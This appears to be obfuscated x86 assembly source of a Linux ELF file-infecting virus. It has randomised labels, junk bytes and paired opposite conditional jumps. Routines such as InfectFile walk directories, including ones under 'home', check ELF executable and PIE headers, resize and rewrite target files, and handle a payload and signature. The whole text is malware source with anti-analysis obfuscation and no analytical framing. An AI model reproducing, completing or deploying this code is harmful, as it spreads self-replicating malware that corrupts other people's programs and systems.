..@7a9zxP1L3p6u:
    mov         rdx, rdx
    jmp         $+3
db 0xbe
    je          ..@ew8Vr4uRlDIn
    jne         ..@ew8Vr4uRlDIn
..@U4MuvADUcMuJ:
    push        rcx
    jmp         $+5
db 0x89, 0xfe, 0x80
    jmp         ..@Ejkga1inCTCt
..@5GLridCF5U0U:
    push        r3
    jmp         $+3
db 0x1f
    je          ..@dlPeegwoH0nA
    jne         ..@dlPeegwoH0nA
..@0JEL6V10p1Ka:
    push        rsi
    jb          ..@xLfJkvJJudHX
    jae         ..@xLfJkvJJudHX
..@N0vOOVWzSfOp:
    pop         rbx
    jb          ..@evnGDrV2xn4J
    jae         ..@evnGDrV2xn4J
..@OUvabuKsowG9:
    push        rax
    jmp         $+5
db 0xb6, 0x66, 0x20
    jmp         ..@uyrSU0tnRTei
..@7JfW42qfLUUO:
    mov         rsi, rsi
    jmp         $+4
db 0x91, 0x02
    jb          ..@uorQbr6lB0qL
    jae         ..@uorQbr6lB0qL
..@BvKmJhzsxz1H:
    pop         r1
    je          ..@eHrMCDVPobXy
    jne         ..@eHrMCDVPobXy
..@lWsxB6VM47Oc:
    xor         rax, rax
    jb          ..@V4sxld6U7wRJ
    jae         ..@V4sxld6U7wRJ
..@twLSkNc3Vzsw:
    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
    jmp         ..@2G4kc1XMKJ6F
..@NEnC1qb7DLzW:
    pop         rbx
    jmp         $+4
db 0xe0, 0x89
    jmp         $+3
db 0x7d
    jmp         $+4
db 0xdf, 0x1c
    jl          ..@yPgWUaDs7jII
    jge         ..@yPgWUaDs7jII
..@uZ8Jd9VpzAMB:
    mov         r1, r5
    jmp         $+4
db 0x72, 0x90
    jl          ..@pzuXuF5moC5R
    jge         ..@pzuXuF5moC5R
..@SMbAKbOgrEgC:
    xchg        rsi, rsi
    jmp         ..@WD8gRK2Nx6OF
..@uwjNTTdd4sDs:
    pop         rcx
    js          ..@JGI6XNyFA5mf
    jns         ..@JGI6XNyFA5mf
..@VOxFmSdskIMo:
    xor         rcx, rcx
    jmp         $+5
db 0xdf, 0x19, 0x5a
    js          ..@KCRdhtzZhq0I
    jns         ..@KCRdhtzZhq0I
..@jXUXD8EwZfe7:
    call        Strcpy
    jmp         $+3
db 0xbc
    jmp         $+3
db 0xf0
    jb          ..@H3BiBEuu9tU2
    jae         ..@H3BiBEuu9tU2
..@hQ7vK9Jz0Dxp:
    xor         r3, r3
    jmp         $+3
db 0x57
    jmp         $+3
db 0x1c
    jmp         ..@5ROBfaaoLi9s
..@TVQ6aTYJB1co:
    xor         rcx, rcx
    js          ..@Hm7GfzvJivx4
    jns         ..@Hm7GfzvJivx4
..@Ng5MKFQ2cssM:
    mov         rcx, rcx
    jmp         $+5
db 0x21, 0x21, 0x54
    jl          ..@NyRp8eMYmSO7
    jge         ..@NyRp8eMYmSO7
..@aHDfK4zMB9Yd:
    add         rdi, rax
    jmp         $+3
db 0x89
    jb          ..@l0XmwddRfdvy
    jae         ..@l0XmwddRfdvy
..@m39VzguGjkcF:
    cmp         BYTE [r1], 0x0
    jmp         $+3
db 0xa5
    jb          ..@p3AJcvpIqcvG
    jae         ..@p3AJcvpIqcvG
..@dB3Jq2cBpkC9:
    mov         rsp, rsp
    jmp         ..@7ngu8yWk1kKl
..@o7Ir00a0qNVm:
    pop         rdx
    je          ..@ZAd0SDl2Vd9P
    jne         ..@ZAd0SDl2Vd9P
..@HGwcnZgZeNYl:
    mov         rsp, rsp
    jmp         $+5
db 0x6a, 0x49, 0xbc
    jmp         ..@Olc7dqc1weq8
..@nJccP6h4Koa3:
%ifdef X86_32
    push        rcx
%endif
    jmp         $+5
db 0x69, 0x61, 0x01
    jmp         ..@7qzQ74wjfzpF
..@0Ll5xqOxypa2:
    push        rdi
    jmp         ..@CQHxVBhIZoSs
..@HWKNGcXUqGBf:
    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
    jmp         $+4
db 0xcb, 0xae
    jl          ..@jqDAYTnrR5mL
    jge         ..@jqDAYTnrR5mL
..@Ra2mp0g89mqK:
    mov         rbx, rbx
    jmp         $+4
db 0x20, 0x9d
    jmp         $+5
db 0xa0, 0x35, 0x2b
    jb          ..@VMb11VYJLNp8
    jae         ..@VMb11VYJLNp8
..@0cTynF6sdH7z:
    pop         rax
    jmp         ..@QaVsj82wrnKi
..@qpQp3JKQwAVb:
    push        rbx
    jmp         ..@S3CylWQmg3av
..@6X7RbimlsyWv:
    pop         rbx
    jmp         $+4
db 0x90, 0xa3
    jmp         $+3
db 0x31
    js          ..@EyxGAQrOMs5D
    jns         ..@EyxGAQrOMs5D
..@Z8aOxb2mc0GM:
    push        rdi
    jmp         $+3
db 0x31
    jmp         ..@LbVFw1zGpLUl
..@sbRlz6Hnvhaz:
    push        rdi
    jmp         ..@zsNt1sVTvfPe
..@zLIT26btdv3h:
    xchg        rdi, rdi
    jmp         $+3
db 0x96
    jl          ..@zomRZ2VSSvGX
    jge         ..@zomRZ2VSSvGX
..@EGljoSeaTkGf:
    push        rsi
    jmp         ..@KyIvwIHxW36u
..@LztvvmBtKicW:
    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
    jmp         $+4
db 0x27, 0xfa
    js          ..@ZFCG9Gb0tWL7
    jns         ..@ZFCG9Gb0tWL7
..@S696bAhKlzqb:
    pop         rdx
    jmp         $+3
db 0x17
    js          ..@wiuajMHz79qp
    jns         ..@wiuajMHz79qp
..@INZGaU5euTpX:
    add         r1, _signature-_start
    jmp         ..@3PLP5UFXgI8A
..@UYIL1OipLzMc:
    pop         rdx
    jmp         ..@4ShEW0PDAaMw
..@bSf6uP4RJWJI:
    pop         rdi
    jmp         $+5
db 0x1d, 0xcd, 0xe0
    jb          ..@yPcPuOpGBzAK
    jae         ..@yPcPuOpGBzAK
..@SgM9Jw9PAtSY:
    push        rbx
    jl          ..@S2NYZGDw3kAU
    jge         ..@S2NYZGDw3kAU
..@gYcuPjfg15Tp:
    mov         rbp, rbp
    jb          ..@dfAF7h5kI5KJ
    jae         ..@dfAF7h5kI5KJ
..@XvphT8vened6:
    pop         rcx
    jmp         $+3
db 0xb4
    jb          ..@Pj1tMNMSzZcL
    jae         ..@Pj1tMNMSzZcL
..@DtTjZGEkTMst:
    sub         rax, QWORD [rsp+_LZSSE_OFF.saveoutptr]
    jmp         $+5
db 0x06, 0x57, 0xfb
    jmp         ..@K3mxLhSwvSGy
..@cAvLZRBjpBdY:
    cmp         BYTE [rsp+_INFDIR_OFF.depth], SUBDIR_MAXDEPTH
    jmp         $+3
db 0x31
    jmp         ..@7ysnytBb16ub
..@50Okg85fbhTZ:
    mov         rdi, rdi
    jmp         $+4
db 0x4e, 0x85
    jmp         ..@tJOHkV8G4quE
..@0XwBjbdgQijE:
    pop         rdx
    jmp         DYNPIEValidation
..@8DGt8E1cOmZ0:
    mov         rsp, rsp
    js          ..@V6rQQHpGf2yI
    jns         ..@V6rQQHpGf2yI
..@uYHlVKz6MDFO:
    pop         rdi
    jmp         $+5
db 0x86, 0xd9, 0xe2
    jmp         $+4
db 0x10, 0xf6
    jb          ..@BXuW1k3JcI67
    jae         ..@BXuW1k3JcI67
..@TkdDhLlEoWf2:
    cmp         WORD [rsp+_LZSSE_OFF.la_index], ax
    jmp         $+4
db 0xae, 0x6e
    jmp         $+4
db 0x18, 0xf7
    jmp         $+3
db 0x7b
    js          ..@s9aHY8Uo9dAx
    jns         ..@s9aHY8Uo9dAx
..@WdpMGiwC6lO7:
    jmp         ..@jO5fGnCutNi9
    jmp         $+3
db 0x6c
    js          ..@gFYI2P8briir
    jns         ..@gFYI2P8briir
..@M7Y8YWdcu0xA:
    pop         rcx
    je          ..@FFtnjFBkUCJW
    jne         ..@FFtnjFBkUCJW
..@SGHREBmASdKh:
    xor         rax, rax
    jmp         $+4
db 0x51, 0x2d
    jmp         $+4
db 0x91, 0xf3
    jmp         ..@Ll00HWPuNCXC
..@fc2Z3dQcDq3M:
    VAR         packed, status
    jmp         $+5
db 0x64, 0x9b, 0x8b
    jb          ..@gYcuPjfg15Tp
    jae         ..@gYcuPjfg15Tp
..@QU6sz9CIwVsm:
    xor         rax, rax
    jmp         ..@WV8vaHBRlyZR
..@g0X9jWvraNOc:
    xchg        rcx, rcx
    jmp         $+4
db 0x35, 0x1b
    jmp         ..@91XzPbK6eYnl
..@8XBikfyE0WHu:
    push        rdx
    jmp         $+4
db 0x52, 0xbf
    jmp         ..@aqH2RsnX5Inn
..@ixmcSePw9Vrh:
    xchg        rsp, rsp
    je          ..@m39VzguGjkcF
    jne         ..@m39VzguGjkcF
..@t53z1leFfmL2:
    mov         rsp, rsp
    je          ..@RLbJiS8GnXgy
    jne         ..@RLbJiS8GnXgy
..@UVRzP2pNyV9P:
    lea         r1, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
    jmp         ..@ZKfiVOM4vLFk
..@X40UJXB2efda:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    jmp         $+4
db 0xca, 0xa0
    jmp         $+3
db 0xe1
    jmp         ..@aHDfK4zMB9Yd
..@tdvKETiBhnoG:
    mov         rax, rax
    jb          ..@LztvvmBtKicW
    jae         ..@LztvvmBtKicW
..@I19MqXjcWFPR:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    js          ..@TkdDhLlEoWf2
    jns         ..@TkdDhLlEoWf2
..@KyIvwIHxW36u:
    pop         rsi
    jb          ..@HWKNGcXUqGBf
    jae         ..@HWKNGcXUqGBf
..@r6uXVPEYGchB:
    test        eax, eax
    jmp         $+3
db 0x8d
    jmp         $+4
db 0x51, 0x22
    jb          ..@v5U42yPW76Gt
    jae         ..@v5U42yPW76Gt
..@bMPd2eaYjZKa:
    call_vsp    Strlen
    js          ..@7QsF7FFXoJUc
    jns         ..@7QsF7FFXoJUc
..@UkvRSWUCeCVs:
    mov         eax, SYS_MREMAP
    jmp         ..@OIuA04oyYfPU
..@jXE7eY7pRZX1:
    mov         rdi, rdi
    jmp         $+5
db 0x52, 0x64, 0xf5
    js          ..@nljE7b7PdtMy
    jns         ..@nljE7b7PdtMy
..@NSDd0SyYe21v:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    jmp         ..@HGMbigDcffq1
..@oaKBorleslB7:
    mov         rdi, rdi
    jmp         $+3
db 0xd3
    jmp         ..@DTF3SAuBwX42
NonBinaryFile:
    jmp         ..@4Nnq0s9cjfWW
..@inWJtTLEpekE:
    movzx       r3, WORD [r1+e_h.e_phentsize]
    jmp         $+3
db 0xc2
    jmp         $+5
db 0xeb, 0xaa, 0xe1
    jmp         ..@r6b08IOKe2dg
..@g41r5rBYE6n0:
    push        rsi
    jl          ..@Obb5SZM8eLxh
    jge         ..@Obb5SZM8eLxh
..@jFMWxWg2JKwR:
    mov         rbx, rbx
    js          ..@GRAGBU1gMiA6
    jns         ..@GRAGBU1gMiA6
..@Vad5tkB4aGEe:
    push        rbx
    jmp         $+3
db 0xcc
    jmp         $+4
db 0x7e, 0x0b
    jmp         $+4
db 0x11, 0x2f
    jb          ..@V50oqY6K8hN1
    jae         ..@V50oqY6K8hN1
..@QB7sDNtOMvN2:
%ifdef X86_64
    syscall
%endif
    jmp         $+4
db 0xbb, 0x47
    jb          ..@ecJ5QFUwcaZB
    jae         ..@ecJ5QFUwcaZB
..@p5ojuqgjI2L5:
    mov         QWORD [rsp+_INFDIR_OFF.dirname], r1
    js          ..@lpmbSpuMOVdY
    jns         ..@lpmbSpuMOVdY
..@wSLDTgGEU2pw:
    push        rsi
    jb          ..@qjGEDsmTc8Ss
    jae         ..@qjGEDsmTc8Ss
..@Fz8KW37EV3bc:
    sub         rsp, _PAYLOAD_OFF_size
    jmp         ..@s2zJbkONoC5b
..@C1921oBfyn7Q:
    mov         rsi, QWORD [rsp+_LZSSE_OFF.inputaddr]
    jmp         $+4
db 0x37, 0x57
    js          ..@ZDYBVpMFuLP1
    jns         ..@ZDYBVpMFuLP1
..@3ooOqnvgFVUT:
    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], 0
    jmp         $+5
db 0xc1, 0xf4, 0xd8
    jmp         ..@8aMrWVqFCOfN
..@YsBLJwviXDzZ:
%ifdef X86_32
    int         0x80
%endif
    jb          ..@ssMj1G6HLnRx
    jae         ..@ssMj1G6HLnRx
..@jQSiaeQ6RA2E:
    add         r1, 1
    js          ..@jxyZtT2pVq4p
    jns         ..@jxyZtT2pVq4p
..@7xjPe4gkU8Py:
    mov         rax, SYS_FTRUNCATE
    jmp         $+4
db 0xba, 0x9f
    jmp         $+5
db 0xba, 0x34, 0x31
    jmp         ..@PU1BVHn1UbjH
..@nh45wV0xyYFU:
    xchg        rsp, rsp
    jl          ..@ZtDdXMWk87wA
    jge         ..@ZtDdXMWk87wA
..@Q0G5qqTH8Uag:
    jne         ..@6ERyQxjHYUuD
    jmp         ..@B86LVq0SSnh0
..@DOXrBRsu6Xbi:
    je          ..@ze6X52RRnMOr
    jmp         $+5
db 0x00, 0x03, 0x2c
    jl          ..@iwlwlGY0A7v2
    jge         ..@iwlwlGY0A7v2
..@VtHDMBr9WVYK:
    mov         rbx, rbx
    jmp         $+4
db 0x7d, 0x89
    jmp         $+5
db 0xb7, 0x96, 0x02
    jmp         $+3
db 0xe8
    jmp         ..@BEbUJHb6Po46
..@tXq6O6XxwT69:
    sub         r2, 1
    jmp         $+5
db 0x61, 0xd6, 0xd4
    jl          ..@a24GuiAlFypc
    jge         ..@a24GuiAlFypc
..@ZaIvNOjQKj35:
    cmp         DWORD [r1+1], "home"
    js          ..@FbGigBiVeeJg
    jns         ..@FbGigBiVeeJg
..@ACEn5FS44ETb:
    rep stosb 
    jb          ..@Gy1gtHECo4lz
    jae         ..@Gy1gtHECo4lz
..@x8CpnVExQOVa:
%ifdef X86_64
    mov         r10, 0x22
%endif
    jmp         $+3
db 0xd3
    jmp         ..@Wp7ZDtn5Pztb
..@S8rsoa59pQAy:
    pop         rdi
    jl          ..@RY09oVOptakE
    jge         ..@RY09oVOptakE
..@AfAECSqepSp7:
    jne         ..@nqBKrp4fghKv
    jb          ..@1BlrOR1se9Y4
    jae         ..@1BlrOR1se9Y4
..@3PLP5UFXgI8A:
    mov         r2w, WORD [rsp+_PAYLOAD_OFF.index]
    jmp         $+5
db 0xe8, 0x4f, 0x4a
    jmp         ..@ADLSMP2cnasL
..@C0aE2XA9iH3g:
    mov         rdi, rdi
    jmp         $+4
db 0x8c, 0x4f
    jmp         $+5
db 0xdd, 0x9b, 0x67
    jmp         ..@IAf47shGkLpZ
..@SlfZBn7P1ilM:
    cmp         dl, BYTE [rsp+_LZSSE_OFF.match_len]
    js          ..@WMXUWQwops3G
    jns         ..@WMXUWQwops3G
..@aNPSC5h78T1k:
    mov         BYTE [rdi], al
    jb          ..@t53z1leFfmL2
    jae         ..@t53z1leFfmL2
..@Br1Arj2G8xLl:
    xchg        rax, rax
    jmp         $+5
db 0xa4, 0x63, 0x09
    jmp         ..@PLvvPxLXxPRP
..@r8eLTKtXEzg7:
    jmp         ..@fguSZHCUuTXt
    jl          ..@FIHHdpNVP0mD
    jge         ..@FIHHdpNVP0mD
..@sNhyN3KrsWOO:
    sub         r1, 1
    jl          ..@q30TZQpLcIre
    jge         ..@q30TZQpLcIre
..@l41A9lVSnnHp:
    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer+WINDOW_LENGTH-LOOKAHEAD_LENGTH]
    jmp         $+3
db 0x89
    jl          ..@C1921oBfyn7Q
    jge         ..@C1921oBfyn7Q
..@Jcjr1QU9yeH0:
    inc         QWORD [rsp+_LZSSE_OFF.outputaddr] 
    js          ..@aBwQ5Wjgk3Kh
    jns         ..@aBwQ5Wjgk3Kh
..@GzPVhtW6lb04:
    pop         rcx
    jmp         ..@VrhKie5nxP2m
..@tUo7fJYT6TC7:
    pop         rsi
    je          ..@QU6sz9CIwVsm
    jne         ..@QU6sz9CIwVsm
..@WTgF5iy9Lc0e:
    add         eax, 0x30
    jl          ..@NyKEfLj9mPOs
    jge         ..@NyKEfLj9mPOs
..@7OOrZPBhYX7T:
    lea         r2, [rsp+_PROC_OFF.dirbuf+linux_dirent.d_name+r4]
    jl          ..@X3EEFF3BuQdq
    jge         ..@X3EEFF3BuQdq
..@hFWKB5MIbUOh:
    mov         rsi, rsi
    jmp         $+4
db 0x57, 0x06
    jmp         $+4
db 0x50, 0x4d
    jl          ..@W5jaGzQkAmNM
    jge         ..@W5jaGzQkAmNM
..@BWS41xMeqWLQ:
    xchg        rdx, rdx
    jmp         $+5
db 0x9b, 0x7b, 0xbb
    jmp         ..@N9x7i21UTmPb
..@ZSa72ezPgv8s:
    mov         rsi, rsi
    jl          ..@WdpMGiwC6lO7
    jge         ..@WdpMGiwC6lO7
..@Hy4Pa1YGw18E:
%ifdef X86_64
    xor         rdi, rdi
%endif
    jmp         ..@5RyYTqqbHf4O
..@0KZFtn63Nm14:
    xchg        rcx, rcx
    jmp         $+5
db 0x4e, 0x50, 0x46
    je          ..@UxnzIL6yM3YO
    jne         ..@UxnzIL6yM3YO
..@418Kis9XC25E:
    sub         al, 0x02
    jmp         ..@wfrqvJrnbNU5
..@FFtnjFBkUCJW:
    cmp         BYTE [r1], 0x00
    jmp         ..@OGYpNOdhTBo2
..@ZnMA4R7U2dKj:
    call_vsp    Strlen
    jmp         $+4
db 0x4c, 0x12
    jmp         $+5
db 0x42, 0x80, 0xd7
    js          ..@lMfa70ICqJmb
    jns         ..@lMfa70ICqJmb
..@7qzQ74wjfzpF:
%ifdef X86_32
    pop         rcx
%endif
    jmp         ..@m3SKebuPtW0I
..@2hAOwT7OEnRZ:
    mov         r2, vsp
    js          ..@1eRH1Q40Urrk
    jns         ..@1eRH1Q40Urrk
..@Bj4waQ4sKUuB:
    add         ecx, 1
    jmp         $+5
db 0x39, 0xea, 0x0d
    jmp         $+5
db 0xe0, 0x26, 0xaf
    jl          ..@kqVyUjMNLbDz
    jge         ..@kqVyUjMNLbDz
..@bhLr2KZueNPK:
    mov         rdi, rdi
    jmp         $+5
db 0x83, 0xc8, 0x0f
    je          ..@7a9zxP1L3p6u
    jne         ..@7a9zxP1L3p6u
..@SgD2bnzaizZk:
    push        rax
    jb          ..@PMlgSIgC9Dvi
    jae         ..@PMlgSIgC9Dvi
..@yGt9HjRJfYYP:
    ret
    jmp         $+4
db 0x53, 0x61
    js          DestroyPayload
    jns         DestroyPayload
..@OcjOM0EHoNy7:
    mov         ax, WORD [rsp+_DYNPIE_OFF.shentsize]
    jb          ..@cWTBZLIBWcZ4
    jae         ..@cWTBZLIBWcZ4
..@acIGzO7Fc1pP:
    xchg        rsi, rsi
    jmp         $+5
db 0x6a, 0x40, 0x05
    jmp         ..@bUwFrVyDGaKr
..@NHiWgjq2uMGf:
    inc         WORD m5
    jmp         $+3
db 0xfa
    jmp         ..@SP8RHqHgy1Zt
..@ZJWfNyMXD0sJ:
    rep         stosb
    jmp         $+5
db 0x7c, 0x06, 0xa4
    jb          ..@2x7Hm7KP2xl4
    jae         ..@2x7Hm7KP2xl4
..@PMlgSIgC9Dvi:
    pop         rax
    jmp         $+5
db 0x71, 0x23, 0xde
    jb          ..@ZnApgMs823Ab
    jae         ..@ZnApgMs823Ab
..@lZpuZxMI9djG:
    push        rbx
    jmp         $+3
db 0x34
    jmp         $+4
db 0x7f, 0x0f
    js          ..@7JchInMd9NeI
    jns         ..@7JchInMd9NeI
..@C3A88enJ6CMF:
    add         r4, r3
    jmp         $+3
db 0xf8
    jmp         $+5
db 0xc3, 0x7c, 0x19
    jmp         $+5
db 0x7c, 0xdc, 0x84
    jmp         $+3
db 0xaf
    jmp         $+4
db 0xb7, 0x35
    jmp         ..@n7uQEKaC0TWC
..@CnfMsPIm2dQM:
    mov         BYTE [rsp+_LZSSE_OFF.match_pos], 0x1
    jmp         ..@EgijrRIBp53g
..@LvQ94ihMy7vh:
%ifdef X86_64
    pop         rax
%endif
    je          ..@DDgGudm7p8To
    jne         ..@DDgGudm7p8To
..@LYMp21vJO9Lc:
    pop         rdx
    jl          ..@RBIWJ0kUqGur
    jge         ..@RBIWJ0kUqGur
..@St2xcHiTxam8:
    push        rbx
    jmp         $+5
db 0xf1, 0xb4, 0xa7
    jl          ..@DC84qsmGsVSp
    jge         ..@DC84qsmGsVSp
..@0qpXyCftRIbn:
    push        rdx
    jb          ..@o7Ir00a0qNVm
    jae         ..@o7Ir00a0qNVm
..@wKo6lvgrczj9:
    std
    jmp         $+3
db 0xdf
    je          ..@FCIS0PTS0gC9
    jne         ..@FCIS0PTS0gC9
..@3y0dkXaDV7v0:
    cmp         BYTE [r1], '/'
    jb          ..@pSwo40OKMAdF
    jae         ..@pSwo40OKMAdF
..@ghCp5rceoo5R:
    push        rsi
    jmp         $+5
db 0xe3, 0xb0, 0xbd
    jmp         ..@6NjuKdQAa6wh
..@nkbGfS9bPSXy:
    push        rsi
    jl          ..@iiOo3hIkj0Jc
    jge         ..@iiOo3hIkj0Jc
..@ELOr7ktX3Uol:
    xchg        rbx, rbx
    jmp         ..@vw2gTie34ils
..@v4Jko2lJxItK:
%ifdef X86_32
    mov         ecx, r3
%endif
    jl          ..@uANW3oNfRz7l
    jge         ..@uANW3oNfRz7l
..@BpJIwZ999DNP:
    pop         rax
    jl          ..@8OT9K5dcvd9L
    jge         ..@8OT9K5dcvd9L
..@P8a8qprX13kR:
    push        rsi
    jb          ..@p0l1UCAHRAjK
    jae         ..@p0l1UCAHRAjK
..@41tJPnybCWQN:
    syscall
    jmp         $+5
db 0xae, 0xa7, 0x0b
    jmp         $+3
db 0x4b
    jmp         $+3
db 0xba
    jb          ..@xIF1poiXlTSU
    jae         ..@xIF1poiXlTSU
..@YPMitm4q5Jps:
    jl          ..@ze6X52RRnMOr
    jmp         $+3
db 0x3c
    jmp         $+5
db 0xca, 0x48, 0xff
    js          ..@6XOpzqJiqkYv
    jns         ..@6XOpzqJiqkYv
..@840njcLKrYxB:
    mov         rsi, [rsp+_LZSSE_OFF.inputaddr]
    jmp         $+3
db 0x92
    jmp         $+5
db 0x29, 0xff, 0x4f
    jb          ..@cuYm34Pm4wYy
    jae         ..@cuYm34Pm4wYy
..@11nZPFYafhAS:
    xchg        rcx, rcx
    jmp         ..@qXtYP4mQ3X0S
..@SKCQZEy1Ixkd:
    jz          ..@b57s9zdrznFN
    jmp         $+4
db 0x9e, 0x76
    jmp         $+4
db 0x76, 0x75
    jmp         $+3
db 0xd0
    jb          ..@iqCJUDuAz9Im
    jae         ..@iqCJUDuAz9Im
..@ZaxkTge3m3wl:
%ifdef X86_64
    push        rsi
%endif
    jmp         $+5
db 0x13, 0x44, 0xc6
    jmp         ..@cpYi5gz6l46x
..@Tes2pADptLQS:
    mov         r3d, 0x02
    jmp         $+3
db 0x73
    jmp         $+5
db 0x0a, 0xa7, 0xb6
    jmp         $+3
db 0xde
    js          ..@C5rM6lbjp7GY
    jns         ..@C5rM6lbjp7GY
..@NqhXwh1ieYeS:
    push        r4
    jmp         $+4
db 0xbf, 0x24
    js          ..@F9bbFYD9cIvw
    jns         ..@F9bbFYD9cIvw
..@0sTS74Gqb3iB:
    mov         rsp, rsp
    jmp         ..@12R8f8PnRzUj
..@ITostA6VL1FO:
    push        rbx
    jmp         ..@7wn5AooYLmjS
..@aqX3M8y3X3gl:
    pop         rdx
    jmp         $+4
db 0x8e, 0x7b
    jmp         $+3
db 0x2c
    jmp         ..@osfhFLrSrEbD
..@T4zjNn7bag1b:
    mov         r2, QWORD [r1+e_h.e_entry]
    jmp         $+3
db 0x97
    jmp         $+4
db 0xf7, 0x0e
    jb          ..@glHApS6TgR3e
    jae         ..@glHApS6TgR3e
..@A74KLNxYz5Lb:
    add         r1, signature_len
    jmp         $+5
db 0x09, 0xe1, 0x3a
    jl          ..@ItEdko2qNPqC
    jge         ..@ItEdko2qNPqC
..@kAXVoAcDrb5D:
    xchg        rdx, rdx
    jmp         $+4
db 0x74, 0xd7
    jmp         ..@wRdv1DEgw5H0
..@PLvvPxLXxPRP:
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+5
db 0x9c, 0xc9, 0xb6
    jmp         ..@SuRYsmJF7CAV
InfectFile:
    jmp         ..@KfQV7SGB9q4i
..@LD8Zc9f3kRsY:
    mov         r2, QWORD [r5+file.filesize]
    jmp         $+5
db 0x7c, 0x5d, 0x18
    jmp         $+4
db 0x4d, 0x6e
    js          ..@D1oa83Zgb3VS
    jns         ..@D1oa83Zgb3VS
..@vjuTXntxw1m1:
    push        rdx
    jb          ..@0XwBjbdgQijE
    jae         ..@0XwBjbdgQijE
..@YMto3PCIPcn6:
    mov         rdx, rdx
    jmp         ..@THBEs9GO0xgg
..@qvJZftpSxxmX:
    mov         rax, rax
    jmp         $+3
db 0x89
    je          ..@qZog9jwOz9kk
    jne         ..@qZog9jwOz9kk
..@L9PrT3O8iOwo:
    jne         ..@kvxyBBVN23xy
    je          ..@jLmkx6qzYzsu
    jne         ..@jLmkx6qzYzsu
..@KfQV7SGB9q4i:
    push        rdi
    jmp         $+5
db 0x38, 0x7a, 0xd0
    jl          ..@HFNFSdH4hitH
    jge         ..@HFNFSdH4hitH
..@vgubbpfAayZl:
    mov         rcx, rcx
    jmp         $+5
db 0x52, 0x1e, 0xe8
    jmp         ..@9WOqt66jLgha
..@ehzq6NOy3cM5:
    pop         rax
    jmp         $+5
db 0x4a, 0x8c, 0xd9
    jmp         $+4
db 0xaa, 0x99
    jl          ..@4S9tNv6Tbn29
    jge         ..@4S9tNv6Tbn29
..@P89WtY9AJ92p:
    lea         r5, [rsp+_INFDIR_OFF.dirbuf+r4]
    jmp         ..@O9aOfBNQrf7v
..@wm0bIBHdYDaB:
    mov         rax, rax
    jmp         ..@kOuxVi4ACxi0
..@vs2loaUBZvcx:
    push        rdi
    jmp         ..@zu212Sn3G7Z2
..@MECDYMGUR8cO:
    mov         eax, 1
    jb          ..@7OQTHUCegOpC
    jae         ..@7OQTHUCegOpC
..@38Taf5u3fbR2:
    mul         rbx
    jl          ..@bdJPyGVbmwmJ
    jge         ..@bdJPyGVbmwmJ
..@jb65Lg5rmxFB:
    push        rsi
    jmp         $+4
db 0x1c, 0x1a
    jmp         ..@E5Pr5N9OgqbH
..@kEe01QzSeEts:
    mov         rdi, m6
    jmp         $+4
db 0xb8, 0x69
    jl          ..@Qd3sFNZa6XYN
    jge         ..@Qd3sFNZa6XYN
..@uiUgz07HViTL:
    pop         rbx
    jmp         $+5
db 0x7c, 0x9d, 0x1d
    jmp         $+4
db 0xe1, 0x2a
    jmp         ..@AJoqpZRDeJ1D
..@jkinAWzMkA1K:
    push        rcx
    je          ..@A9NSw0wljD3o
    jne         ..@A9NSw0wljD3o
..@AsCeybbO5aZa:
    mov         rbx, rbx
    jmp         ..@qMZKwHbgY1TG
..@2iHpGX34ZcCU:
    mov         WORD [rsp+_NBF_OFF.index], r2w
    js          ..@RwwIAymFx3Af
    jns         ..@RwwIAymFx3Af
..@nFVORB8oPW7p:
    pop         rcx
    jmp         ..@3ZFnZeSmOYdy
..@NOFAwEDVhtVT:
    push        rax
    jmp         $+3
db 0x57
    jmp         ..@WeMU3pJOEWYA
..@Ejkga1inCTCt:
    pop         rcx
    jmp         $+4
db 0x8f, 0x72
    jb          ..@fvrprKjLN6DI
    jae         ..@fvrprKjLN6DI
..@AKw7AUYdmOXO:
    mov         rsi, r5
    js          ..@7JfW42qfLUUO
    jns         ..@7JfW42qfLUUO
..@dTKVhSleMOYy:
    pop         rdx
    jmp         ..@NKdKq2f7ZenV
..@mR4BT1IHwn1S:
    pop         rcx
    jmp         ..@EUd8tN6Lq7Cf
..@H71Npagh1Fii:
    push        rdi
    jmp         $+4
db 0x75, 0x17
    jb          ..@G8mKV969HHTx
    jae         ..@G8mKV969HHTx
..@rXZAqegfSDX1:
    and         ax, 1111b
    jmp         $+5
db 0xcc, 0x56, 0xc3
    jb          ..@VuDu2SbspgxV
    jae         ..@VuDu2SbspgxV
..@PwsaXDPvYyUw:
    cmp         BYTE [r1+16], ET_EXEC
    jmp         $+4
db 0x14, 0xa7
    jmp         $+4
db 0x0b, 0xdd
    jmp         ..@P7l8ZQUXu9Py
..@RxE1LfYQ9oBO:
%ifdef X86_32
    mov         esi, 0x01
%endif
    jmp         ..@N2REP3sAlNTQ
..@Xt9NKIJjoJtc:
    push        rbx
    jmp         $+3
db 0x6e
    jmp         ..@oHPhq9tLoUIK
..@8sMG7Y2ScoSH:
    cmp         DWORD [rdi+s_h.sh_type], SHT_DYNAMIC
    jmp         $+5
db 0xbe, 0xb0, 0xc3
    jmp         $+3
db 0xa5
    jb          ..@0SXml9XLFrfI
    jae         ..@0SXml9XLFrfI
..@uO7tZyrAkFOm:
    mov         eax, 0x00
    jl          ..@WVFQeXYBPFjj
    jge         ..@WVFQeXYBPFjj
..@IqgP1b5aPDO3:
    push        rdx
    jmp         ..@ZEBbHMB8TLfa
..@mXsbCmo7BcVG:
    mov         ax, WORD [r1]
    jmp         $+4
db 0x08, 0xef
    jl          ..@f0ShLUrT3drC
    jge         ..@f0ShLUrT3drC
..@ome9ltVtpIyy:
    mov         rbx, rbx
    jmp         $+3
db 0x74
    js          ..@6kWPWDqlUJO1
    jns         ..@6kWPWDqlUJO1
..@nGksz0A4eFEn:
    mov         ax, WORD [r5+linux_dirent.d_reclen]
    js          ..@zUJxX1wOI0Rt
    jns         ..@zUJxX1wOI0Rt
..@mfIj63RkyEEQ:
    xchg        rsp, rsp
    je          ..@P89WtY9AJ92p
    jne         ..@P89WtY9AJ92p

_eof:
